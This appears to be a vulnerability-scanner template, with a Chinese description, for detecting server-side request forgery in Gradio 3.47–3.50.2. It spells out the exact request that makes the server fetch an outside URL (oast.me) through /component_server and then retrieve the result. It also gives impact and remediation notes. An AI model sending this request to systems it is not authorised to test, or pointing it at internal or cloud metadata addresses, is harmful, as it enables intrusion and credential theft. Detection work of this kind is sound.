id: gradio-ssrf

info:
  name: Gradio 3.47 - 3.50.2 - 服务端请求伪造漏洞
  author: nvn1729
  severity: high
  description: |
    该模板用于检测 Gradio 3.47 - 3.50.2 - 服务端请求伪造漏洞。该类漏洞通常源于服务端可被诱导请求攻击者指定的 URL 或内部地址。模板主要向 `/`、`/component_server` 等路径发送探测请求，并根据响应中的 `<h1> Interactsh Server </h1>` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可诱使服务器向内网地址、云元数据地址或外部攻击者控制的地址发起请求。
    - 成功利用后可能泄露云临时凭据、探测内网服务、访问未暴露管理接口或触发二次漏洞。
  remediation: |
    - 对服务端发起请求的目标地址实施严格 allowlist，禁止访问本地地址、内网网段和云元数据地址。
    - 禁用不必要的远程 URL 加载功能，并对重定向、DNS 解析和协议类型进行约束。
    - 在网络层限制应用服务器的出站访问，审计异常外联和元数据接口访问记录。
  reference:
    - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
    - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-918
    epss-percentile: 0.36659
    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
  metadata:
    verified: true
    max-request: 2
    shodan-query: html:"__gradio_mode__"
    product: gradio
    vendor: gradio_project
  tags: cve,cve2024,unauth,gradio,ssrf,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /component_server HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - 'contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")'
          - 'contains(tolower(body), "\"method not allowed")'
        condition: or
        internal: true

  - raw:
      - |
        POST /component_server HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}

      - |
        GET /file={{download_path}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        part: body
        name: download_path
        group: 1
        regex:
          - "\"?([^\"]+)"
        internal: true

    payloads:
      fuzz_component_id: helpers/wordlists/numbers.txt

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "<h1> Interactsh Server </h1>"

      - type: status
        status:
          - 200
